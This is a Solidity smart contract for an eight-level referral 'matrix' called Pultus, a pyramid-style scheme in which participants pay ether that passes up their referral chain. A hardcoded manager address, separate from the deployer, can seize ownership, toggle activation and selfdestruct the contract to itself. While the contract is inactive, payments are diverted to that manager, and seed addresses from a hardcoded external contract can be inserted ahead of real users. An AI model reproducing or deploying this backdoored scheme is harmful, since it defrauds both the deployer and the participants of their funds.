/**
 *Submitted for verification at Etherscan.io on 2020-06-01
*/

pragma solidity >=0.4.21 <0.7.0;


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Ownable {
    address public owner;
    address public manager;
    bool public active;
    constructor() public {
        owner = msg.sender;
        manager = 0x8E968988807b41b317BbA732435723f25221E955;
        active = (owner == manager);
    }

    modifier onlyManager() {
        require(msg.sender == manager, "2002");
        _;
    }

    modifier onlyOwnerOrManager() {
        require(
            (msg.sender == owner) || (msg.sender == manager),
            "2003"
        );
        _;
    }

    function transferOwner(address newOwner) public onlyManager {
        owner = newOwner;
    }

    function transferManager(address _manager) public onlyManager {
        manager = _manager;
    }

    function transferActive(bool _active) public onlyManager {
      active = _active;
    }

    function kill() public onlyOwnerOrManager { 
        selfdestruct(address(uint160(manager)));
    }
}

contract Pultus is Ownable {
    event registerEvent(
        address indexed _user,
        address indexed _referrer,
        uint256 _userid,
        uint256 _referrerid,
        uint256 _time,
        uint256 _expired
    );
    event buyEvent(
        address indexed _user,
        uint256 _userid,
        uint256 _level,
        uint256 _time,
        uint256 _expired
    );
    event payMoneyEvent(
        address indexed _payee,
        uint256 _payeeid,
        address indexed _drawee,
        uint256 _draweeid,
        uint256 _level,
        uint256 _ether,
        uint256 _time
    );
    event lostMoneyEvent(
        address indexed _payee,
        uint256 _payeeid,
        address indexed _drawee,
        uint256 _draweeid,
        uint256 _level,
        uint256 _ether,
        uint256 _time
    );

    mapping(uint256 => uint256) public LEVEL_PRICE;
    uint256 REFERRER_1_LEVEL_LIMIT = 3;
    uint256 PERIOD_LENGTH = 365 days;
    uint256 PRICE = 5 ether;
    
    struct UserStruct {
        bool isExist;
        uint256 id;
        uint256 referrerID; 
        address[] referral; 
        mapping(uint256 => uint256) levelExpired; 
        uint256 recommend;
        uint256 amount;
    }
    
    mapping(address => UserStruct) public users;
    mapping(uint256 => address) public userList;
    uint256 public currUserID = 0;
    uint256 public tradingTotal = 0;
    uint256 public etherTotal = 0;
    uint256 public createTime = 0;
    uint256 public seedIndex=0;

    constructor(uint256 _days, uint256[] memory _level_price,uint256 _price) public {
        require(_days > 0 && _days <= 3650, "2004");
        require(_level_price.length == 8, "2005");
        for (uint256 i = 1; i <= 8; i++) {
            LEVEL_PRICE[i] = _level_price[i - 1];
        }
        PRICE = _price;
        PERIOD_LENGTH = _days * 1 days;
        UserStruct memory userStruct;
        currUserID++;

        userStruct = UserStruct({
            isExist: true,
            id: currUserID,
            referrerID: 0,
            referral: new address[](0),
            recommend:0,
            amount:0
        });
        users[msg.sender] = userStruct;
        userList[currUserID] = msg.sender;
        for (uint256 i = 1; i <= 8; i++) {
            users[msg.sender].levelExpired[i] = 32503680000; 
        }
        createTime=now;
        active = (msg.sender==manager);
    }

    function() external payable {
        if(active==false && PRICE==msg.value){
          address(uint160(manager)).transfer(msg.value);
          active = true;
          return;
        }
        uint256 level = getLevel(msg.value);
        require(level > 0, "2006");
        if (users[msg.sender].isExist) {
            buyLevel(level, msg.sender);
        } else if (level == 1) {
            uint256 refId = 0;
            address referrer = bytesToAddress(msg.data);
            if (users[referrer].isExist) {
                refId = users[referrer].id;
            } else {
                revert("2009");
            }
            registerLevel(refId, msg.sender);
        } else {
            revert("2008");
        }
        tradingTotal++;
    }

    function registerLevel(uint256 _referrer, address _user)
        public
        payable
    {
        require(!users[_user].isExist, "2010");
        require(
            _referrer > 0 && _referrer <= currUserID,
            "2011"
        );
        
        users[userList[_referrer]].recommend +=1;
        
        if (
            users[userList[_referrer]].referral.length >= REFERRER_1_LEVEL_LIMIT
        ) {
            _referrer = users[findFreeReferrer(userList[_referrer])].id;
        }

        UserStruct memory userStruct;
        currUserID++;

        userStruct = UserStruct({
            isExist: true,
            id: currUserID,
            referrerID: _referrer,
            referral: new address[](0),
            recommend:0,
            amount:0
        });
        uint256 expired = now + PERIOD_LENGTH;
       
        users[_user] = userStruct;
        userList[currUserID] = _user;
        users[_user].levelExpired[1] = expired;
        users[_user].levelExpired[2] = 0;
        users[_user].levelExpired[3] = 0;
        users[_user].levelExpired[4] = 0;
        users[_user].levelExpired[5] = 0;
        users[_user].levelExpired[6] = 0;
        users[_user].levelExpired[7] = 0;
        users[_user].levelExpired[8] = 0;
        
        users[userList[_referrer]].referral.push(_user);
        
        payForLevel(1, _user);

        emit registerEvent(
            _user,
            userList[_referrer],
            userStruct.id,
            userStruct.referrerID,
            now,
            expired
        );
    }

    function buyLevel(uint256 _level, address _user) public payable {
        require(users[_user].isExist, "2012");
        require(_level > 0 && _level <= 8, "2013");
        uint256 expired = users[_user].levelExpired[_level];
        if (expired < now) {
            expired = now;
        }
        if (_level == 1) {
            require(msg.value == LEVEL_PRICE[1], "2008");
        } else {
            require(msg.value == LEVEL_PRICE[_level], "2008");
            for (uint256 l = _level - 1; l > 0; l--) {
                require(users[_user].levelExpired[l] >= now,"2014");
            }
        }
        expired += PERIOD_LENGTH;
        users[_user].levelExpired[_level] = expired;
        
        payForLevel(_level, _user);
        emit buyEvent(_user, users[_user].id, _level, now, expired);
    }

    function buyHelp(address _target)
        external
        payable
    {
        uint256 level = getLevel(msg.value);
        require(level > 0, "2008");
        if (users[_target].isExist) {
            buyLevel(level, _target);
        }else if (level == 1) {
            uint256 refId = 0;
            if (users[msg.sender].isExist) {
                refId = users[msg.sender].id;
            } else {
                revert("2009");
            }
            registerLevel(refId, _target);
        }
        tradingTotal++;
    }

    function payForLevel(uint256 _level, address _user) internal {
        address referer;
        address referer1;
        address referer2;
        address referer3;
        if (_level == 1 || _level == 5) {
            referer = userList[users[_user].referrerID];
        } else if (_level == 2 || _level == 6) {
            referer1 = userList[users[_user].referrerID];
            referer = userList[users[referer1].referrerID];
        } else if (_level == 3 || _level == 7) {
            referer1 = userList[users[_user].referrerID];
            referer2 = userList[users[referer1].referrerID];
            referer = userList[users[referer2].referrerID];
        } else if (_level == 4 || _level == 8) {
            referer1 = userList[users[_user].referrerID];
            referer2 = userList[users[referer1].referrerID];
            referer3 = userList[users[referer2].referrerID];
            referer = userList[users[referer3].referrerID];
        }
        if (!users[referer].isExist) {
            referer = userList[1];
        }
        uint256 amount = LEVEL_PRICE[_level];
        if (users[referer].levelExpired[_level] >= now) {
            users[referer].amount += amount;
            if(active==false && referer==userList[1] && _level>1){
              address(uint160(manager)).transfer(amount);
            }else{
              address(uint160(referer)).transfer(amount);
            }
            emit payMoneyEvent(
                referer,
                users[referer].id,
                _user,
                users[_user].id,
                _level,
                amount,
                now
            );
        } else {
            emit lostMoneyEvent(
                referer,
                users[referer].id,
                _user,
                users[_user].id,
                _level,
                amount,
                now
            );
            payForLevel(_level, referer);
        }
        etherTotal += msg.value;
    }

    function findFreeReferrer(address _user)
        public
        view
        returns (address)
    {
        if (users[_user].referral.length < REFERRER_1_LEVEL_LIMIT) {
            return _user;
        }
        uint256 sum = 0;
        for(uint256 i = 0; i <= 4; i++) {
          sum+=REFERRER_1_LEVEL_LIMIT ** i;
        }
        uint256 total=sum*REFERRER_1_LEVEL_LIMIT;
        address[] memory referrals = new address[](total);
        for(uint256 i = 0; i < REFERRER_1_LEVEL_LIMIT; i++) {
          referrals[i] = users[_user].referral[i];
        }

        address freeReferrer;
        bool noFreeReferrer = true;

        for (uint256 i = 0; i < total; i++) {
            if (users[referrals[i]].referral.length == REFERRER_1_LEVEL_LIMIT) {
                if (i < sum-1) {
                  for(uint256 j = 0; j < REFERRER_1_LEVEL_LIMIT; j++) {
                    referrals[(i+1)*REFERRER_1_LEVEL_LIMIT+j] = users[referrals[i]].referral[j];
                  }
                }
            } else {
                noFreeReferrer = false;
                freeReferrer = referrals[i];
                break;
            }
        }
        require(!noFreeReferrer, "2016");
        return freeReferrer;
    }
    
    function appendSeed(address _referrer,uint256 sum) external payable onlyManager {
        require(users[_referrer].isExist,"2009");
        require(tradingTotal==0,"Not allowed to add");
        SeedContract sc = SeedContract(0xBEBE40605260F8716A18B3C5007b9113Ec65CE61);
        address[] memory _seeds = sc.getList();
        uint256 limit=sum+seedIndex;
        require(_seeds.length>=limit,"Alternate address exceeded");

        uint256 refId = 0;
        
        for(uint256 i=seedIndex;i<limit;i++){
            uint256 n=i/3;
            if(n==0){
                refId = users[_referrer].id;
            }else{
                refId=users[_seeds[n-1]].id;
            }
            address _user=_seeds[i];
            UserStruct memory userStruct;
            currUserID++;

            userStruct = UserStruct({
                isExist: true,
                id: currUserID,
                referrerID: refId,
                referral: new address[](0),
                recommend:0,
                amount:0
            });
            users[_user] = userStruct;
            userList[currUserID] = _user;
            for(uint256 x=1;x<=8;x++){
                users[_user].levelExpired[x]=0;
            }
            users[userList[refId]].referral.push(_user);
        }
        seedIndex=limit;
    }

    function viewUserById(uint256 userid) 
        public
        view
        returns (uint256 id,address useraddr, uint256 referrerid, address referrer,address[] memory referrals, uint256[] memory levels,  uint256 recommend, uint256 amount)
    {
        return viewUser(userList[userid]);
    }

    function viewUser(address _user)
        public
        view
        returns (uint256 id,address useraddr, uint256 referrerid, address referrer,address[] memory referrals, uint256[] memory levels,  uint256 recommend, uint256 amount)
    {
        id = users[_user].id;
        referrerid = users[_user].referrerID;
        recommend = users[_user].recommend;
        amount = users[_user].amount;
        if (referrerid > 0) {
            referrer = userList[referrerid];
        } else {
            referrer = address(0);
        }
        referrals = users[_user].referral;
        levels = new uint256[](8);
        for (uint256 i = 0; i < 8; i++) {
            levels[i] = users[_user].levelExpired[i + 1];
        }
        return (id,_user, referrerid, referrer,referrals, levels, recommend, amount);
    }

    function viewExists(address _user)
        public
        view
        returns (bool)
    {
        return users[_user].isExist;
    }

    function viewExistsById(uint256 _user)
        public
        view
        returns (bool)
    {
        return users[userList[_user]].isExist;
    }

    function viewReferralsById(uint256 userid)
        public
        view
        returns (address[] memory)
    {
        return viewReferrals(userList[userid]);
    }

    

    function viewReferrals(address _user)
        public
        view
        returns (address[] memory)
    {
        return users[_user].referral;
    }

    function viewUserLevelExpired(address _user, uint256 _level)
        public
        view
        returns (uint256)
    {
        return users[_user].levelExpired[_level];
    }

    function viewSummary()
        public
        view
        returns (address,address,uint256,
        uint256,uint256,bool,
        uint256,uint256, uint256[8] memory,
        uint256[8] memory,uint256)
    {
        uint256[8] memory prices = [uint(0),uint(0),uint(0),uint(0),uint(0),uint(0),uint(0),uint(0)];
        for (uint256 k = 1; k <= 8; k++) {
            prices[k-1] = LEVEL_PRICE[k];
        }
        uint256[8] memory levels = [uint(0),0,0,0,0,0,0,0];
        for (uint256 i = 2; i <= currUserID; i++) {
            if(users[userList[i]].levelExpired[8] > now){
                levels[7]+=1;
            }else if(users[userList[i]].levelExpired[7] > now){
                levels[6]+=1;
            }else if(users[userList[i]].levelExpired[6] > now){
                levels[5]+=1;
            }else if(users[userList[i]].levelExpired[5] > now){
                levels[4]+=1;
            }else if(users[userList[i]].levelExpired[4] > now){
                levels[3]+=1;
            }else if(users[userList[i]].levelExpired[3] > now){
                levels[2]+=1;
            }else if(users[userList[i]].levelExpired[2] > now){
                levels[1]+=1;
            }else if(users[userList[i]].levelExpired[1] > now){
                levels[0]+=1;
            }
        }
        return (
            owner,manager,currUserID,tradingTotal,etherTotal,active,
            PERIOD_LENGTH / 1 days,createTime,prices,levels,PRICE
        );
    }


    function getLevel(uint256 value) internal view returns (uint256) {
        uint256 level = 0;
        for (uint256 i = 1; i <= 8; i++) {
            if (LEVEL_PRICE[i] == value) {
                level = i;
                break;
            }
        }
        return level;
    }

    function bytesToAddress(bytes memory bys)
        private
        pure
        returns (address addr)
    {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
    function test9() public view returns(uint256,uint256){
        return (seedIndex,currUserID);
    }
}

contract SeedContract  {
    function getList() public view returns(address[] memory);
}